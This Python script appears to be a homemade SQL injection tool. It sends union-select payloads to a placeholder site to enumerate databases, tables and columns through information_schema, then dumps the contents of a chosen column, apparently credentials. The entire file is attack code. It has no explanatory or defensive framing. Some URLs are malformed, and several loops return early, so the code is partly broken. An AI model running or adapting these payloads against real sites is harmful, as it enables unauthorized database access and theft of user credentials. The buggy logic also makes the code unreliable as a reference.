import requests
import bs4


def fetchDatabaseCount():
    url = "www.example.com' and 0 union select 1,2,3,4,count(schema_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata-- -"
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    temp = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    count = temp.get_text().strip()
    return count


variable = fetchDatabaseCount()
print(variable)




databasename = []


def fetchDatabaseName():
    for name in range(1, int(variable) + 1):
        url = (
            "http:www.example.com' and 0 union select 1,2,3,4,schema_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata limit "
            + str(name)
            + "-- -"
        )
        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        temps = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        name = temps.get_text().strip()
        databasename.append(name)


fetchDatabaseName()
print(databasename)


databasename = input("Enter Your Dataabse Name : ")
print(databasename)


def tablecount():
    url = (
        "http://www.example.com' and 0 union select 1,2,3,4,count(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema='"
        + databasename
        + "'-- -"
    )
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    temps = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    cat = temps.get_text().strip()
    return cat


y = tablecount()
print(y)




tablename = []


def fetchtablename():
    for table in range(1, int(y) + 1):
        url = (
            "http:www.example.com' and 0 union select 1,2,3,4,table_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema='"
            + databasename
            + "' limit "
            + str(table)
            + " -- -"
        )
        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        temp = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        dog = temp.get_text().strip()
        tablename.append(dog)


fetchtablename()
print(tablename)




tablename = input("Enter Your Table Name : ")
print(tablename)


def fetchcolumncount():
    url = (
        "http://www.example.com' and 0 union select 1,2,3,4,count(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema= '"
        + databasename
        + "'-- -"
    )
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    temp = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    horse = temp.get_text().strip()
    return horse

z = fetchcolumncount()
print(z)



columnname = []

def fetchcolumnaname():
    for column in range(1, int(z) + 1):
        url = (
            "http:www.example.com' and 0 union select 1,2,3,4,column_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema= '"
            + databasename
            + "'  and table_name = '"
            + tablename
            + "' limit "
            + str(column)
            + "-- -"
        )
        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        temp = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        hello = temp.get_text().strip()
        return hello

columnname.append(fetchcolumnaname())
print(columnname)



columnname = input("Enter Your Column Name : ")
print(columnname)



def credentialscount():
    url = (
        "http://www.example.com' and 0 union select 1,2,3,4,count("
        + columnname
        + "),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "
        + tablename
        + " -- -"
    )
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    temp = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    data = temp.get_text().strip()
    return data

c = credentialscount()
print(c)





cred = []

def datas():
    for fuck in range(1, int(c) + 1):
        url = (
            "http://www.example.com' and 0 union select 1,2,3,4,"
            + columnname
            + ",6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "
            + tablename
            + " limit "
            + str(fuck)
            + " -- -"
        )
        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        temp = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        goat = temp.get_text().strip()
        return goat
    cred.append(datas())

print(cred)